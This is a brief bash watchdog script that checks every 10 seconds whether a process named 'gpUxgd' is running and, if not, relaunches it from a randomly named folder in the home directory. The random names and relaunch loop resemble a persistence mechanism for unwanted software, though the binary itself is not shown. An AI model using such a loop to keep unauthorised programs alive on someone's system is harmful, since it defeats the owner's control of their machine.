#!/bin/bash


check_process_by_name() {
    	local PROCESS_NAME=$1





	# Check if the process is running and not a zombie
	if ps aux | grep -v grep | grep -q "$PROCESS_NAME"; then
	    # Check if the process state is not 'Z' (zombie)
	    if ps -o stat= -C "$PROCESS_NAME" | grep -q -v 'Z'; then
            :
	    else
        cd ~
        cd gpUxgdSz
        ./gpUxgd
	    fi
	else
        cd ~
        cd gpUxgdSz
        ./gpUxgd
	fi
}




while true; do
	check_process_by_name "gpUxgd"

	sleep 10
done
